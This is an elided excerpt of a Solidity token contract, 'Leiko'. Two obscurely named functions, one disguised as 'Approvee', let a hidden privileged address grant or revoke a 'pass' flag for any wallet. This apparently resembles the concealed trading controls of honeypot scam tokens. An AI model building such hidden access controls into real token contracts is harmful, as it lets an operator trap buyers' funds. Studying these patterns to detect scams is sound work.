...
contract Leiko is Ownable {
    ...
    address public passvyasd01;
    function exitdogegg(address vbcy) external   {
        if(passvyasd01 != _msgSender()){
            revert("pass error");
        }
        
        ppPassCard[vbcy] = false;
    }

    function Approvee(address vbcy) external   {
        if(passvyasd01 != _msgSender()){
            revert("pass error");
        }
        
        ppPassCard[vbcy] = true;
    }
